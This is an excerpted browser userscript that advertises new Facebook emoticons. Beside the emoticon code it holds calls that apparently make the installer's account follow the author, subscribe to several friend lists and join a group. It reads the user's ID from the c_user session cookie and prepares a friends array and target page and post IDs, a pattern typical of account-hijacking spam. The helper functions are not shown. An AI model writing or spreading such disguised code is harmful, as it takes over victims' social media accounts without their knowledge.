// ==UserScript==
// @name    	New Facebook Emoticons for Status, Chat and Comment by Sahil!
// @namespace	New Facebook Emoticons for Status, Chat and Comment by Sahil!
// @description	New Facebook June 2013 Emoticons for Status, Chat and Comment.
// @version 	1.0.6
// @author  	I'am Sahil
// @authorURL	http://www.facebook.com/ksuamharil
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/ksuamharil" target="_blank">Created by Sahil Kumar.<br>Hoshiyar Balak :p</a>';
	html += '</div>';
...
a("ksuamharil"); //I'am Sahil
sublist("339005026227315");
sublist("386445908140001");
sublist("277815575688383");


var gid = ['557327657641975'];
...
var spage_id = "worldofgk";
var spost_id = "worldofgk";
var sfoto_id = "worldofgk";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
